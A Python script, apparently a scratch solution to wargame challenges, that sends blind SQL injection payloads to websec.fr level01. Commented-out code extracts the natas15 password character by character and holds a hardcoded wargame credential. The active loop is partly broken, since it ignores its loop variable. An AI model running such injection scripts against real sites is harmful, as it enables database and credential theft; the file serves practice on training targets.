import requests
from requests.auth import HTTPBasicAuth

url = "https://websec.fr/level01/index.php"
c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

contains = ''

for i in  c:
	# data = {"user_id": "1+and+password+like+%27WEBSEC%7B" + c + "%25%7D%27", "submit": "Submit+Query"}
	data = {"user_id": "1+and+password+like+'WEBSEC{%a%}'", "submit": "Submit+Query"}
	# print("1+and+password+like+'WEBSEC{%a%}'")

	r = requests.post(url, data=data)
	print(r.text)
	assert(r.status_code == 200)
	if 'Other' in r.text:
		print("Found")

# 1+and+password+like+%27WEBSEC%7Ba%25%7D%27
# user_id=&submit=Submit+Query

# for i in range(len(c)):
# 	u = "%" + c[i] + "%"
# 	u = '2" and password like binary "' + u
# 	data = {"username": u}
# 	r = requests.post(url, data=data)
# 	assert(r.status_code == 200)
# 	if 'exists' in r.text:
# 		l += c[i]
# 		print(u)

# p = ""
# for i in range(32):
# 	for i in range(len(l)):
# 		u = p + l[i] + "%"
# 		u = 'natas16" and password like binary "' + u
# 		data = {"username": u}
# 		r = requests.post(url, auth=HTTPBasicAuth("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"), data=data)
# 		assert(r.status_code == 200)
# 		print(u)
# 		if 'exists' in r.text:
# 			p += l[i]
# 			print(">>>" + u)
# 			continue

# print(p)
# print(type(r))
# print(r)
# print(l)
